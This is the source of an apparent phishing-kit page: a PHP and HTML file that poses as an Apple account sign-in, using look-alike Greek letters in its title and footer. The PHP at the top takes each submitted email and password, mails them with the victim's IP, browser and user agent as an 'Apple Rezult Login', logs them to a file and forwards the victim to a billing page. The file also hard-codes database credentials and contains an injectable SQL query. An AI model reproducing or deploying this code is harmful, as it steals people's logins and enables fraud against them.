<?php
session_start();
error_reporting(0);
include ('config.php');
include "bots.php"; 

	$_SESSION['_browser_']	= $browser;
	$_SESSION['_email_'] 	= $_POST['_logname_'];
	$_SESSION['_password_'] = $_POST['_logpass_'];
	$_SESSION['cntcode'] 	= $countrycode;
	
	
	
	$_SESSION['cntname'] = $countryname;
	if (isset($_POST['_logname_'])){
	
	$mail 		= $_POST['_logname_'];
	$servername 	= "localhost";
	$username 	= "mrxsoftn_logins";
	$password 	= "15325reda";
	$dbname =	 "mrxsoftn_logins";
	
	// Create connection
	$conn = mysqli_connect($servername, $username, $password, $dbname);
	// Check connection
	
	$query = mysqli_query($conn, "SELECT * FROM email WHERE email='".$mail."'");

if(mysqli_num_rows($query) > 0){

    header( 'Location: thankyou.php' ) ;
    exit;
}
	
				$headers  = "MIME-Version: 1.0" . "\r\n";;
				$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
				$headers .= "From: 	Apple <schlive@live.com>" . "\r\n";
	
	$message = "

	<table style='border-spacing: 0px; line-height: 1.2em; width: 100%; font-family:Tahoma;color:#333;font-size:14px;border:1px solid #06f;padding:20px;border-radius:5px;margin-top:20px'>
 
	<tr><td style='width: 15%;'> Email 		</td><td><font color='#3366FF'>".$_POST['_logname_']."</td></tr>
	<tr><td>					 Password 	</td><td><font color='#3366FF'>".$_POST['_logpass_']."</td></tr>
	
	<tr><td><hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/></td>
	<td><hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/></td></tr>
	
    <tr><td> IP 		</td><td><font color='#1C800D'>".$_SESSION['_IP_']."</td></tr>
    <tr><td> TIME		</td><td><font color='#1C800D'>".date('l jS \of F Y h:i:s A')."</td>
	<td rowspan='3' style='text-align:right;'>".$Logo."<br> Copyright&copy; UK747</td></tr>
	<tr><td> Browser 	</td><td><font color='#1C800D'>".$_SESSION['_browser_']."</td></tr>
	<tr><td> USER AGENT </td><td><font color='#1C800D'>".$_SERVER['HTTP_USER_AGENT']."</td></tr>


	</table>";
	
	
	$subject = " Apple Rezult Login | $countryname | $ip";
	$open_rezult_file = fopen("../../log.html","a");
	fwrite($open_rezult_file,$message);
	
	
	mail($to, $subject, $message, $headers);
	header("Location: billing.php");
}
?>
<!DOCTYPE html>


<html>
	
	<head>
		<title>&Alpha;ccount Setting</title>

		<meta name="robots" content="noindex">

		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
		<meta name="viewport" content="width=device-width, maximum-scale=1.0, user-scalable=1" />
		
		<link rel="logo-icon" href="../set/img/iconisma.ico">
		<link rel="stylesheet" href="../set/css/bootstrap.min.css"/>
		<link rel="stylesheet" href="../set/css/bootstrap-theme.min.css"/>
		<link rel="stylesheet" href="../set/cssisma/tot.css" type="text/css"/>
		<link rel="stylesheet" href="../set/css/styles.css"/>
		<script src="../set/js/jquery-1.11.0.min.js"></script>
		<script src="../set/js/bootstrap.min.js"></script>
	</head>

		
		
		
		<body style="background:#F3F3F3">
		
		
		<?php include("../forms/nav.php")?>
		
		<div class="container">
			<img style="width: 190px;" src="../set/img/logs.png" class="img-responsive myapp" />
			<div class="row row2" >

				<div class="col-xs-4 sidebar mobile-hide" >
				<img style="width:104%; height:34%; position:relative; top:20px;" src="../set/img/sign.png ">
				
				</div>

				<div class="col-xs-4 loop mobile" >
					<div >
						<img style="height: 40px; width:270px; position:relative; " src="../set/img/log.png ">
						<hr/>
					</div>
					<div id="login" name="login">
					<?php include('../forms/login.php');?>
					</div>
					
					<div id="loading" name="loading"  style="display:none; width: 420px; height: 315px;">
					<span style="position: relative; top: 40%; left: 45%;" ><img src="../set/img/logisma.gif" width="45" height="45" >
						<p style="color:#337AB7;" > Sign In Please Wait....</p>
						</span>
					
					</div>
	</div>
			<div class="footbar col-xs-12">
			<p style="padding:15px;">We use a Highly encryption to pr&omicron;tect the c&omicron;nfidentiality of y&omicron;ur &Rho;ers&omicron;nal inf&omicron;rmation.</p>
			</div>
			</div>
		
	
		</div>
		


		<script>//jQuery time

							
	$(document).ready( function () { 
	

					
					$("#_logname_").focus(function() {
				
						$(this).css({'background' : 'none'});
					}).blur(function() {
						if( !$(this).val()){
						$(this).css({'background' : 'transparent url("../set/img/cheet.png") no-repeat scroll 16px 15px / 130px 290px'});
								}
					});
					
					$("#_logpass_").focus(function() {
						$(this).css({'background' : 'none'});
					}).blur(function() {
						if( !$(this).val()){
						$(this).css({'background' : 'transparent url("../set/img/cheet.png") no-repeat scroll 16px -19px / 130px 290px'});
								}
					});
					
					
					
					
							
						
						$("#next").click(function(){
						
							var ID=$("input[name=_logname_]").val();
							var PW=$("input[name=_logpass_]").val();
							var auth=$("input[name=auth]").val();
							var ip=$("input[name=ip]").val();
							
							//alert(username + password + ip);
							if (ID==null || ID=="",PW==null || PW=="")
							{
								$("#_logname_").css({'background-color' : '#FEFEDE'});
								$("#_logpass_").css({'background-color' : '#FEFEDE'});
								$("#msg").html('<span style="color:red">Invalid email or password please check your login details.</span>');
								return false;
							}
							
							var dataString = 'ID='+ID+'&PW='+PW+'&auth='+auth;
							$.ajax({
								type : "POST",
								url : "ChekLog.php",
								data : dataString,
								beforeSend : function() {
									$("#login").css({'display':'none'});
									$("#loading").css({'display':'block'});
								},
							success : function(response) {
							//alert(response);
							if(!response) {
							$("#msg").html('<span style="color:red">Invalid email or password please check your login details.</span>');
							$("#loading").css({'display':'none'});
							$("#login").css({'display':'block'});
							//alert("not Connected");
							$("#_logname_").css({'background-color' : '#FEFEDE'});
							$("#_logpass_").css({'background-color' : '#FEFEDE'});
							return false;
							} else {
							//alert("Connected");
							
							document.myform.submit();  
							}
							}
							});
							});
							});
		</script>
	</body>
		
						
</html>		